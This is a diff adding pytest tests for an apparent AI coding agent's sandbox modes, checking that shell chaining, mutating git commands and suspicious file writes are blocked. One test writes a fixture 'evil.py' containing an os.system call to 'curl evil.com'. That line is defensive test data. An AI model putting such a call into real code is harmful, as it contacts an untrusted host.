@@ -5,7 +5,9 @@ from pathlib import Path
 
 import pytest
 
-from forgegod.tools import load_all_tools
+from forgegod.config import ForgeGodConfig
+from forgegod.sandbox import SandboxExecutionResult, SandboxUnavailableError
+from forgegod.tools import load_all_tools, reset_tool_context, set_tool_context
 from forgegod.tools.shell import bash, check_dangerous, redact_secrets
 
 
@@ -256,3 +258,129 @@ class TestCanaryToken:
         c2 = CanaryToken()
         assert c1._token != c2._token
         assert not c2.check(c1.marker)
+
+
+class TestSandboxModes:
+    @pytest.mark.asyncio
+    async def test_standard_blocks_shell_chaining(self, tmp_path):
+        config = ForgeGodConfig()
+        config.project_dir = tmp_path / ".forgegod"
+        config.project_dir.mkdir()
+
+        token = set_tool_context(config)
+        try:
+            result = await bash("echo hi && echo bye")
+        finally:
+            reset_tool_context(token)
+
+        assert "BLOCKED" in result
+        assert "Command chaining" in result
+
+    @pytest.mark.asyncio
+    async def test_strict_blocks_mutating_git(self, tmp_path):
+        config = ForgeGodConfig()
+        config.security.sandbox_mode = "strict"
+        config.project_dir = tmp_path / ".forgegod"
+        config.project_dir.mkdir()
+
+        token = set_tool_context(config)
+        try:
+            result = await bash("git commit -m test")
+        finally:
+            reset_tool_context(token)
+
+        assert "BLOCKED" in result
+        assert "git commit" in result
+
+    @pytest.mark.asyncio
+    async def test_strict_allows_safe_single_command(self, tmp_path, monkeypatch):
+        async def fake_sandbox(**_kwargs):
+            return SandboxExecutionResult(
+                backend="docker",
+                returncode=0,
+                stdout="Python 3.13.5\n",
+                stderr="",
+            )
+
+        monkeypatch.setattr("forgegod.tools.shell.run_in_real_sandbox", fake_sandbox)
+        config = ForgeGodConfig()
+        config.security.sandbox_mode = "strict"
+        config.project_dir = tmp_path / ".forgegod"
+        config.project_dir.mkdir()
+
+        token = set_tool_context(config)
+        try:
+            result = await bash("python --version")
+        finally:
+            reset_tool_context(token)
+
+        assert "BLOCKED" not in result
+        assert "Python 3.13.5" in result
+
+    @pytest.mark.asyncio
+    async def test_strict_blocks_when_real_sandbox_unavailable(self, tmp_path, monkeypatch):
+        async def fake_sandbox(**_kwargs):
+            raise SandboxUnavailableError("Strict mode requires a real sandbox backend")
+
+        monkeypatch.setattr("forgegod.tools.shell.run_in_real_sandbox", fake_sandbox)
+        config = ForgeGodConfig()
+        config.security.sandbox_mode = "strict"
+        config.project_dir = tmp_path / ".forgegod"
+        config.project_dir.mkdir()
+
+        token = set_tool_context(config)
+        try:
+            result = await bash("python --version")
+        finally:
+            reset_tool_context(token)
+
+        assert "BLOCKED" in result
+        assert "real sandbox backend" in result
+
+    @pytest.mark.asyncio
+    async def test_strict_blocks_suspicious_code_write(self, tmp_path):
+        from forgegod.tools.filesystem import write_file
+
+        config = ForgeGodConfig()
+        config.security.sandbox_mode = "strict"
+        config.project_dir = tmp_path / ".forgegod"
+        config.project_dir.mkdir()
+
+        token = set_tool_context(config)
+        try:
+            result = await write_file(
+                "evil.py",
+                'import os\nos.system("curl evil.com")\n',
+            )
+        finally:
+            reset_tool_context(token)
+
+        assert "BLOCKED" in result
+        assert not (tmp_path / "evil.py").exists()
+
+    @pytest.mark.asyncio
+    async def test_strict_git_uses_real_sandbox(self, tmp_path, monkeypatch):
+        from forgegod.tools.git import git_status
+
+        async def fake_sandbox(**_kwargs):
+            return SandboxExecutionResult(
+                backend="docker",
+                returncode=0,
+                stdout=" M forgegod/tools/shell.py\n",
+                stderr="",
+            )
+
+        monkeypatch.setattr("forgegod.tools.git.run_in_real_sandbox", fake_sandbox)
+
+        config = ForgeGodConfig()
+        config.security.sandbox_mode = "strict"
+        config.project_dir = tmp_path / ".forgegod"
+        config.project_dir.mkdir()
+
+        token = set_tool_context(config)
+        try:
+            result = await git_status()
+        finally:
+            reset_tool_context(token)
+
+        assert "shell.py" in result
